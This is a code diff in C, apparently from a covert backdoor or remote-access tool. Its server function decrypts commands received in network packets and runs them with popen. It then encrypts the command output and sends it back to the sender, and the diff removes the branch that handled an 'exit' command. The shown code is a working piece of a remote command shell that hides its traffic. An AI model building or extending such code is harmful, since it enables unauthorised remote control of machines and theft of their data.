@@ -334,27 +334,19 @@ bool server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
 
                     fprintf(stdout, "Decypher: %d | %s\n", decryptedtext_len, decryptedtext);
 
-                    if (strcmp(decryptedtext, "exit") != 0)
-                    {
-                        // Get Output
-                        char *output = (char *)malloc(OUTPUT_SIZE);
-                        fp = popen(decryptedtext, "r");
-                        fread(output, 1, OUTPUT_SIZE, fp);
-                        fprintf(stdout, "Return: %s \n", output);
+                    // Get Output
+                    char *output = (char *)malloc(OUTPUT_SIZE);
+                    fp = popen(decryptedtext, "r");
+                    fread(output, 1, OUTPUT_SIZE, fp);
+                    fprintf(stdout, "Return: %s \n", output);
 
-                        // Cypher
-                        unsigned char *ciphertext = (unsigned char *)malloc(OUTPUT_SIZE * 2);
-                        int cypher_len = forgepacket(ciphertext, output, OUTPUT_SIZE);
+                    // Cypher
+                    unsigned char *ciphertext = (unsigned char *)malloc(OUTPUT_SIZE * 2);
+                    int cypher_len = forgepacket(ciphertext, output, OUTPUT_SIZE);
 
-                        // Send
-                        client(dest_addr, source_addr, dest_port, ciphertext, cypher_len);
-                        open = false;
-                    }
-                    else
-                    {
-                        close(recv_socket); /* close the socket so we don't hose the kernel */
-                        return false;
-                    }
+                    // Send
+                    client(dest_addr, source_addr, dest_port, ciphertext, cypher_len);
+                    open = false;
 
                     // Reset Counters
                     packet_count = 0;
